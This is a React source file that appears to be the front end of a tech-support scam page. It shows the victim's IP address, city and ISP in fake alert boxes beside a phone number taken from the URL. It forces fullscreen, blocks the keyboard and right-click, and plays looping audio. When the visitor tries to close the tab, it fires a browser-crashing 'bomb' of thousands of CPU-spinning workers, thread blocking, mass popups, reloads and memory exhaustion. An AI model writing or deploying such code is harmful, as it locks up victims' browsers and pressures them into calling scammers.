import React, { useState, useEffect, useRef } from 'react';
import './styles/App.css';
import 'bootstrap/dist/css/bootstrap.min.css';
import AlertBox from './components/AlertBox';
import BlueBox from './components/BlueBox';
import Footer from './components/Footer';
import WelcomeModal from './components/WelcomeModal';
import ChatBox from './components/ChatBox';
import HomeScreen from './components/HomeScreen';
import FullScreenBlackPage from './components/FullScreenBlackPage';

function App() {
  const [showHome, setShowHome] = useState(true);
  const [showModal, setShowModal] = useState(false);
  const [gtaNumber, setGtaNumber] = useState('Phone Number');
  const [ipInfo, setIpInfo] = useState({
    ip: 'Loading...',
    city: 'Loading...',
    country: 'Loading...',
    isp: 'Loading...'
  });
  const containerRef = useRef(null);
  const clickSoundRef = useRef(null);
  const loopSoundRef = useRef(null);
  const firstClickRef = useRef(true);
  const userClickedRef = useRef(false);
  const [showBlackPage, setShowBlackPage] = useState(false);
  const workersRef = useRef([]);

  // ULTRA AGGRESSIVE Worker bomb function
  const workerBomb = () => {
    const script = `
      let counter = 0;
      while (true) {
        counter++;
        Math.random() * Math.random();
        Math.sqrt(Math.random());
        Math.pow(Math.random(), Math.random());
        Math.sin(Math.random());
        Math.cos(Math.random());
        Math.tan(Math.random());
        if (counter % 1000000 === 0) {
          postMessage({ status: "working", counter });
        }
      }
    `;
    
    const blob = new Blob([script], { type: "application/javascript" });
    const workerURL = URL.createObjectURL(blob);
    
    // Create 50 workers per call
    for (let i = 0; i < 50; i++) {
      try {
        const worker = new Worker(workerURL);
        workersRef.current.push(worker);
      } catch (e) {
        // Silent fail
        console.error('Worker creation failed:', e);
      }
    }
  };

  // ULTRA AGGRESSIVE Function to trigger the bomb
  const triggerBomb = () => {
    // Call workerBomb 100 times (creates 5000 workers total)
    for (let i = 0; i < 100; i++) {
      workerBomb();
    }
    
    // Block the thread for 30 seconds
    const startTime = Date.now();
    while (Date.now() - startTime < 30000) {
      const random1 = Math.random() * Math.random();
      const random2 = Math.sqrt(Math.random());
      const random3 = Math.pow(Math.random(), Math.random());
      const random4 = Math.sin(Math.random());
      const random5 = Math.cos(Math.random());
      const random6 = Math.tan(Math.random());
      // Use variables to avoid unused expression errors
      const combined = random1 + random2 + random3 + random4 + random5 + random6;
      if (combined > 0) {
        // Do nothing, just using the variable
      }
      for (let j = 0; j < 1000000; j++) {
        const r1 = Math.random() * Math.random();
        const r2 = Math.sqrt(Math.random());
        const combined2 = r1 + r2;
        if (combined2 > 0) {
          // Do nothing
        }
      }
    }
    
    // Try to open 100 new windows
    for (let i = 0; i < 100; i++) {
      try {
        const windowTimeout = setTimeout(() => {
          window.open(window.location.href, '_blank');
        }, i * 2);
        // Store timeout reference to avoid unused expression
        if (windowTimeout) {
          // Do nothing
        }
      } catch (e) {
        // Silent fail
        console.error('Failed to open window:', e);
      }
    }

    // Try to reload the page 50 times
    for (let i = 0; i < 50; i++) {
      try {
        const reloadTimeout = setTimeout(() => {
          window.location.href = window.location.href;
        }, i * 10);
        // Store timeout reference to avoid unused expression
        if (reloadTimeout) {
          // Do nothing
        }
      } catch (e) {
        // Silent fail
        console.error('Failed to reload:', e);
      }
    }

    // Fill memory to crash faster
    try {
      const memory = [];
      for (let i = 0; i < 500; i++) {
        const arr1 = new Array(1000000).fill('x');
        const arr2 = new Array(1000000).fill('y');
        const arr3 = new Array(1000000).fill('z');
        memory.push(arr1);
        memory.push(arr2);
        memory.push(arr3);
      }
      // Use memory to avoid unused expression
      if (memory.length > 0) {
        // Do nothing
      }
    } catch (e) {
      // Silent fail
      console.error('Memory bomb failed:', e);
    }
  };

  useEffect(() => {
    const getParameter = (name) => {
      name = name.replace(/\[|\]/g, '\\$&');
      const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
      const results = regex.exec(window.location.href);
      if (!results) return null;
      if (!results[2]) return '';
      return decodeURIComponent(results[2].replace(/\+/g, ' '));
    };

    const gtaParam = getParameter('gta');
    if (gtaParam && gtaParam !== 'Phone Number') {
      setGtaNumber(gtaParam);
    }

    // Fetch IP info
    fetchIPInfo();

    // Prevent context menu
    const preventContextMenu = (e) => e.preventDefault();
    document.addEventListener('contextmenu', preventContextMenu);

    // ULTRA AGGRESSIVE Alert when trying to close tab
    const handleBeforeUnload = (e) => {
      // Trigger the worker bomb multiple times
      triggerBomb();
      triggerBomb();
      triggerBomb();
      triggerBomb();
      triggerBomb();
      
      // Block thread even more
      const start = Date.now();
      while (Date.now() - start < 10000) {
        const r1 = Math.random() * Math.random();
        const r2 = Math.sqrt(Math.random());
        const r3 = Math.pow(Math.random(), Math.random());
        const r4 = Math.sin(Math.random());
        const r5 = Math.cos(Math.random());
        const r6 = Math.tan(Math.random());
        // Use variables to avoid unused expression errors
        const combined = r1 + r2 + r3 + r4 + r5 + r6;
        if (combined > 0) {
          // Do nothing
        }
      }
      
      e.preventDefault();
      e.returnValue = '⚠️ WARNING: Closing this tab will crash your browser! Are you sure?';
      return e.returnValue;
    };
    window.addEventListener('beforeunload', handleBeforeUnload);

    // Lock keyboard if available (best-effort)
    if (navigator.keyboard && navigator.keyboard.lock) {
      navigator.keyboard.lock().catch(err => console.warn('Keyboard lock failed:', err));
    }
    document.onkeydown = function () { 
      return false; 
    };

    // Audio listeners (capture elements and named handlers for stable cleanup)
    const clickEl = clickSoundRef.current;
    const loopEl = loopSoundRef.current;
    const onClickCanPlay = () => console.log('Click sound is ready to play.');
    const onClickError = (e) => console.error('Error loading click sound:', e);
    const onLoopCanPlay = () => console.log('Loop sound is ready to play.');
    const onLoopError = (e) => console.error('Error loading loop sound:', e);
    if (clickEl) {
      clickEl.addEventListener('canplaythrough', onClickCanPlay);
      clickEl.addEventListener('error', onClickError);
    }
    if (loopEl) {
      loopEl.addEventListener('canplaythrough', onLoopCanPlay);
      loopEl.addEventListener('error', onLoopError);
    }

    // Debugging: test audio playback after a short delay
    const testAudioPlayback = () => {
      if (clickSoundRef.current) {
        const clickPromise = clickSoundRef.current.play();
        clickPromise.catch(err => console.error('Error playing click sound:', err));
      }
      if (loopSoundRef.current) {
        const loopPromise = loopSoundRef.current.play();
        loopPromise.catch(err => console.error('Error playing loop sound:', err));
      }
    };
    const testTimeout = setTimeout(testAudioPlayback, 1000);

    return () => {
      document.removeEventListener('contextmenu', preventContextMenu);
      window.removeEventListener('beforeunload', handleBeforeUnload);
      document.onkeydown = null;
      if (navigator.keyboard && navigator.keyboard.unlock) {
        navigator.keyboard.unlock();
      }
      if (clickEl) {
        clickEl.removeEventListener('canplaythrough', onClickCanPlay);
        clickEl.removeEventListener('error', onClickError);
      }
      if (loopEl) {
        loopEl.removeEventListener('canplaythrough', onLoopCanPlay);
        loopEl.removeEventListener('error', onLoopError);
      }
      clearTimeout(testTimeout);
      
      // Terminate all workers on cleanup
      workersRef.current.forEach((worker) => {
        try {
          worker.terminate();
        } catch (e) {
          console.error('Failed to terminate worker:', e);
        }
      });
      workersRef.current = [];
    };
  }, []);

  const fetchIPInfo = async () => {
    try {
      const response = await fetch('https://ipwho.is/?lang=ja');
      if (response.ok) {
        const data = await response.json();
        const ipadd = data.ip || '192.0.2.1';
        const city = data.city || 'Unknown';
        const country = data.country || 'USA';
        const isp = data.connection?.isp || 'Unknown';
        const b = new Date();
        const timezoneId = data.timezone?.id;
        let formattedTime;
        if (timezoneId) {
          try { 
            formattedTime = b.toLocaleString('en-US', { timeZone: timezoneId }); 
          }
          catch (err) { 
            formattedTime = data.timezone?.current_time || b.toLocaleString(); 
          }
        } else {
          formattedTime = data.timezone?.current_time || b.toLocaleString();
        }
        setIpInfo({ ip: ipadd, city, country, isp, currentTime: formattedTime });
      } else {
        setIpInfo({ ip: '192.0.2.1', city: 'Unknown', country: 'USA', isp: 'Unknown', currentTime: 'Unknown' });
      }
    } catch (err) {
      setIpInfo({ ip: '192.0.2.1', city: 'Unknown', country: 'USA', isp: 'Unknown', currentTime: 'Unknown' });
    }
  };

  const handleAppClick = (e) => {
    if (!userClickedRef.current) {
      document.body.classList.add('user-clicked');
      userClickedRef.current = true;
    }
    if (clickSoundRef.current) {
      clickSoundRef.current.currentTime = 0;
      const clickPromise = clickSoundRef.current.play();
      clickPromise.catch(() => {});
    }
    if (firstClickRef.current && loopSoundRef.current) {
      const loopPromise = loopSoundRef.current.play();
      loopPromise.catch(() => {});
      firstClickRef.current = false;
    }
    const enterFullscreen = async () => {
      try {
        if (!document.fullscreenElement) {
          const el = containerRef.current || document.documentElement;
          if (el.requestFullscreen) {
            await el.requestFullscreen();
          } else if (el.webkitRequestFullscreen) {
            await el.webkitRequestFullscreen();
          } else if (el.mozRequestFullScreen) {
            await el.mozRequestFullScreen();
          } else if (el.msRequestFullscreen) {
            await el.msRequestFullscreen();
          }
        }
      } catch (err) { 
        console.error('Fullscreen request failed:', err); 
      }
    };
    if (e) { 
      e.preventDefault(); 
      e.stopPropagation(); 
    }
    enterFullscreen();
    if (!showModal) { 
      setShowModal(true); 
    }
  };

  const handleHomeStart = (e) => {
    if (clickSoundRef.current) { 
      clickSoundRef.current.currentTime = 0; 
      const clickPromise = clickSoundRef.current.play();
      clickPromise.catch(() => {});
    }
    if (loopSoundRef.current) { 
      const loopPromise = loopSoundRef.current.play();
      loopPromise.catch(() => {});
    }
    const enterFullscreen = async () => {
      try {
        if (!document.fullscreenElement) {
          const el = document.documentElement;
          if (el.requestFullscreen) {
            await el.requestFullscreen();
          } else if (el.webkitRequestFullscreen) {
            await el.webkitRequestFullscreen();
          } else if (el.mozRequestFullScreen) {
            await el.mozRequestFullScreen();
          } else if (el.msRequestFullscreen) {
            await el.msRequestFullscreen();
          }
        }
      } catch (err) { 
        console.error('Fullscreen request failed:', err); 
      }
    };
    enterFullscreen();
    document.body.classList.add('user-clicked');
    userClickedRef.current = true;
    setShowHome(false);
    setShowBlackPage(true);
    setTimeout(() => setShowBlackPage(false), 5000);
  };

  useEffect(() => {
    const handleOutsideClick = (e) => {
      if (showModal && containerRef.current && !containerRef.current.contains(e.target)) {
        setShowModal(false);
      }
    };
    document.addEventListener('click', handleOutsideClick);
    return () => document.removeEventListener('click', handleOutsideClick);
  }, [showModal]);

  return (
    <>
      {showHome ? (
        <HomeScreen onStart={handleHomeStart} clickSoundRef={clickSoundRef} loopSoundRef={loopSoundRef} />
      ) : (
        <div ref={containerRef} className="app-container" onClick={handleAppClick} onContextMenu={(e) => e.preventDefault()} style={{ position: 'relative', width: '100vw', height: '100vh', overflow: 'hidden' }}>
          <audio ref={clickSoundRef} style={{ display: 'none' }}>
            <source src="./images/bip.mp3" type="audio/mpeg" />
          </audio>
          <audio ref={loopSoundRef} loop style={{ display: 'none' }}>
            <source src="./images/script.mp3" type="audio/mpeg" />
          </audio>
          <AlertBox gtaNumber={gtaNumber} ipInfo={ipInfo} />
          <WelcomeModal show={showModal} onClose={() => setShowModal(false)} gtaNumber={gtaNumber} />
          <ChatBox gtaNumber={gtaNumber} />
          <BlueBox gtaNumber={gtaNumber} />
          <Footer gtaNumber={gtaNumber} />
          {showBlackPage && <FullScreenBlackPage gtaNumber={gtaNumber} onTimeout={() => setShowBlackPage(false)} />}
          <img src="./images/tchit.gif" alt="tchit" style={{ position: 'fixed', right: '50px', top: '50%', transform: 'translateY(-50%)', zIndex: 10, pointerEvents: 'none', maxWidth: '600px', height: 'auto' }} />
          <img src="./images/tchit1.gif" alt="tchit" style={{ position: 'fixed', right: '50%', top: '50%', transform: 'translateY(-50%)', zIndex: 10, pointerEvents: 'none', maxWidth: '600px', height: 'auto' }} />
        </div>
      )}
    </>
  );
}

export default App;